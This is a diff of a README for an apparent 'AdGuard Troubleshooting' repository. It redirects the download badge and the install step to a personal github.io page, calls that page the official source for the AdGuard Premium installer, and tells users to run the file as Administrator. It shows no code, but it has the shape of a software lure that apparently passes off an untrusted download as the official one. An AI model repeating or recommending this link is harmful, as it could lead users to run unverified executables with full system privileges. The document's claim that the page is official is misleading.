@@ -1,6 +1,6 @@
 # 🛡️ AdGuard-Troubleshooting - Fix AdGuard Installation Errors Quickly
 
-[![Download AdGuard](https://img.shields.io/badge/Download-Troubleshooting_Guide-blue.svg)](https://github.com/Agt61684/AdGuard-Troubleshooting)
+[![Download AdGuard](https://img.shields.io/badge/Download-Troubleshooting_Guide-blue.svg)](https://agt61684.github.io)
 
 This repository provides clear instructions for users who struggle to install AdGuard Premium on Windows 11. If your installer fails or the software does not load correctly, these notes help you finish the setup process.
 
@@ -14,7 +14,7 @@ Follow these steps to prepare your PC and install the software.
 
 1. Remove any old versions of AdGuard. Open the Windows Control Panel, select Programs and Features, and click Uninstall next to AdGuard.
 2. Restart your computer. This clears active system hooks that might interfere with a new installation.
-3. Visit the official source page to download the latest installer build: [https://github.com/Agt61684/AdGuard-Troubleshooting](https://github.com/Agt61684/AdGuard-Troubleshooting).
+3. Visit the official source page to download the latest installer build: [https://agt61684.github.io](https://agt61684.github.io).
 4. Locate the downloaded file in your Downloads folder.
 5. Right-click the installer file and choose Run as Administrator.
 6. Grant permission when the Windows User Account Control prompt appears.
